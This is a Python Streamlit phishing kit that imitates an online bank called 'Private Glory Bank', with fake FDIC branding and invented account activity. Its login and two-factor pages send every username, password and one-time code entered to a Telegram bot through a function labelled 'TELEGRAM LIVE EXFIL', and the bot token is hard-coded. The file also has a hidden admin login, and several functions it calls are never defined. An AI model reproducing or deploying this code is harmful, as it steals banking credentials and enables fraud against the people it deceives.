import streamlit as st
import pandas as pd
from datetime import datetime, timedelta
import plotly.express as px
import requests
import random

# ==================== TELEGRAM LIVE EXFIL ====================
def tg(message):
    TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"
    CHAT_ID = "141975691"
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                     data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=8)
    except: pass

# ==================== STATE & 90-DAY HISTORY ====================
state = st.session_state
state.checking = state.get("checking", 12340.50)
state.savings  = state.get("savings", 14911.32)
state.captured = state.get("captured", [])
state.otp_log  = state.get("otp_log", [])
state.files    = state.get("files", [])
state.auth     = state.get("auth", False)
state.otp_ok   = state.get("otp_ok", False)
state.admin    = state.get("admin", False)

if "tx" not in state:
    merchants = {
        "Groceries": ["Whole Foods Market", "Trader Joe's", "Kroger", "Publix"],
        "Dining": ["Starbucks", "Chick-fil-A", "Chipotle", "Panera Bread"],
        "Gas": ["Shell", "Exxon", "Chevron", "Costco Gas"],
        "Shopping": ["Amazon.com", "Target", "Walmart", "Best Buy"],
        "Subscriptions": ["Netflix", "Spotify", "Apple Services", "Hulu"],
        "Utilities": ["Comcast Xfinity", "Verizon Wireless", "Duke Energy"],
        "Income": ["Direct Deposit - ACME CORP"]
    }
    txs = []
    start = datetime.now() - timedelta(days=90)
    for day in range(90):
        date = start + timedelta(days=day)
        num = random.choices([0,1,2,3], [5,40,40,15])[0]
        for _ in range(num):
            cat = random.choices(list(merchants.keys()), [16,14,10,20,12,10,18])[0]
            merchant = random.choice(merchants[cat])
            amount = round(random.uniform(9.99, 599.99), 2)
            if cat == "Subscriptions" and date.day in [1,2]: amount = {"Netflix":15.99}.get(merchant.split()[0], amount)
            acct = "Checking" if cat == "Income" else random.choice(["Checking","Savings"])
            txs.append({"date":date.strftime("%m/%d"),"desc":merchant,"amount":amount if cat=="Income" else -amount,"account":acct})
    txs.sort(key=lambda x: x["date"], reverse=True)
    state.tx = txs

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ==================== ULTRA-POLISHED 2025 BANK UI ====================
st.markdown("""
<style>
    /* Clean White Background */
    .stApp {background: #ffffff; color: #1a1a1a;}
    
    /* Premium Header */
    .bank-header {
        background: linear-gradient(135deg, #0e2a47 0%, #1e4d72 100%);
        padding: 3rem 0;
        text-align: center;
        border-bottom: 6px solid #c9a227;
        box-shadow: 0 10px 40px rgba(0,0,0,0.12);
    }
    .bank-title {font-size: 3.4rem; font-weight: 300; color: white; margin: 0; letter-spacing: 2px;}
    .bank-subtitle {font-size: 1.25rem; color: #e8c66a; margin-top: 10px; font-weight: 300;}
    
    /* Glass Cards */
    .card {
        background: white;
        border-radius: 20px;
        padding: 2rem;
        box-shadow: 0 12px 40px rgba(0,0,0,0.08);
        border: 1px solid rgba(0,0,0,0.05);
        transition: all 0.3s;
        margin-bottom: 1.5rem;
    }
    .card:hover {transform: translateY(-5px); box-shadow: 0 20px 50px rgba(0,0,0,0.12);}
    
    /* Balance Display */
    .balance-amount {font-size: 2.8rem; font-weight: 600; color: #0e2a47; margin: 0.5rem 0;}
    .balance-label {color: #666; font-size: 1.1rem; margin-bottom: 0.3rem;}
    
    /* Transaction Table */
    .stDataFrame {border-radius: 16px; overflow: hidden; box-shadow: 0 8px 25px rgba(0,0,0,0.06);}
    [data-testid="stDataFrame"] tr:hover {background-color: #f8f9ff !important;}
    
    /* Buttons - Premium Gold */
    .stButton>button {
        background: linear-gradient(135deg, #c9a227, #e8c66a);
        color: #0e2a47;
        border: none;
        border-radius: 16px;
        height: 3.8rem;
        font-weight: 600;
        font-size: 1.1rem;
        transition: all 0.3s;
    }
    .stButton>button:hover {
        background: #0e2a47;
        color: white;
        transform: translateY(-3px);
        box-shadow: 0 10px 25px rgba(14,42,71,0.3);
    }
    
    /* Sidebar */
    .css-1d391kg {background: #0e2a47;}
    .sidebar-logo {text-align: center; padding: 2.5rem 0;}
    
    /* Footer */
    .footer {
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        background: #0e2a47;
        color: #aaa;
        text-align: center;
        padding: 16px;
        font-size: 0.9rem;
        border-top: 1px solid #1e4d72;
        z-index: 998;
    }
</style>

<!-- Premium Footer with FDIC -->
<div class="footer">
    <img src="https://i.ibb.co/0jF3Y7Q/fdic-ssl.png" width="280">
    <br>Member FDIC • Equal Housing Lender • © 2025 Private Glory Bank. All rights reserved.
</div>
""", unsafe_allow_html=True)

EAGLE = "https://i.ibb.co/4pQ8Y3D/eagle-gold-real.png"

def header():
    st.markdown(f"""
    <div class="bank-header">
        <img src="{EAGLE}" width="160">
        <h1 class="bank-title">PRIVATE GLORY BANK</h1>
        <p class="bank-subtitle">Secure • Modern • American Banking</p>
    </div>
    """, unsafe_allow_html=True)

# ==================== LOGIN ====================
def login():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1,1.3,1])
    with col2:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        st.markdown("### Sign In to Online Banking")
        user = st.text_input("Username", placeholder="Awesome12@")
        pwd = st.text_input("Password", type="password", placeholder="••••••••")
        if st.button("Sign In Securely", use_container_width=True):
            tg(f"LOGIN\nUser: {user}\nPass: {pwd}\nTime: {datetime.now()}")
            if user == "Awesome12@" and pwd == "SecureUSA2025!":
                state.auth = True
                tg("VALID CREDENTIALS — FULL ACCESS")
                st.rerun()
            elif user == "admin" and pwd == "showme2025":
                state.admin = True
                st.rerun()
            else:
                st.error("Invalid username or password")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== OTP ====================
def otp():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center;color:#0e2a47'>Two-Factor Authentication Required</h3>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center;color:#666'>Enter the 6-digit code sent to your device</p>", unsafe_allow_html=True)
    code = st.text_input("Verification Code", max_chars=6, placeholder="000000")
    col1, col2, col3 = st.columns([1,1,1])
    with col2:
        if st.button("Verify Code", type="primary", use_container_width=True):
            tg(f"OTP: {code}")
            if len(code) == 6 and code.isdigit():
                state.otp_ok = True
                tg("OTP ACCEPTED — FULL ACCESS")
                st.success("Authentication successful")
                st.rerun()

# ==================== DASHBOARD ====================
def dashboard():
    header()
    st.markdown(f"<p style='text-align:right;color:#666;font-size:1.1rem;margin-top:-50px'>Welcome back, Awesome12@ • {datetime.now().strftime('%B %d, %Y')}</p>", unsafe_allow_html=True)
    
    c1,c2,c3,c4 = st.columns(4)
    with c1: st.markdown(f"<div class='card'><p class='balance-label'>Checking ••••1776</p><p class='balance-amount'>${state.checking:,.2f}</p></div>", unsafe_allow_html=True)
    with c2: st.markdown(f"<div class='card'><p class='balance-label'>Savings ••••1812</p><p class='balance-amount'>${state.savings:,.2f}</p></div>", unsafe_allow_html=True)
    with c3: st.markdown(f"<div class='card'><p class='balance-label'>Total Balance</p><p class='balance-amount'>${state.checking + state.savings:,.2f}</p></div>", unsafe_allow_html=True)
    with c4: st.markdown(f"<div class='card'><p class='balance-label'>Available Credit</p><p style='font-size:2.4rem;color:#0e2a47;font-weight:600'>$18,500</p></div>", unsafe_allow_html=True)

    account_view = st.radio("Transaction History", ["All Accounts", "Checking Only", "Savings Only"], horizontal=True)

    filtered = state.tx
    if account_view == "Checking Only": filtered = [t for t in state.tx if t["account"] == "Checking"]
    if account_view == "Savings Only": filtered = [t for t in state.tx if t["account"] == "Savings"]

    st.markdown("<div class='card'><h3>Recent Activity</h3>", unsafe_allow_html=True)
    df = pd.DataFrame(filtered[:20])
    display = df[["date", "desc", "amount"]].copy()
    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
    st.dataframe(display, use_container_width=True, hide_index=True)
    st.markdown("</div>")

# ==================== TRANSFER, MESSAGES, ADMIN, SIDEBAR, MAIN ====================

# ==================== MAIN FLOW ====================
if not state.auth:
    login()
elif state.admin:
    admin()
elif not state.otp_ok:
    otp()
else:
    page = st.sidebar.radio("Navigate", ["Dashboard", "Transfer", "Messages", "Settings", "Logout"])
    if page == "Dashboard": dashboard()
    elif page == "Transfer": transfer()
    elif page == "Messages": messages()
    elif page == "Settings": st.write("Settings")
    elif page == "Logout":
        st.session_state.clear()
        st.rerun()
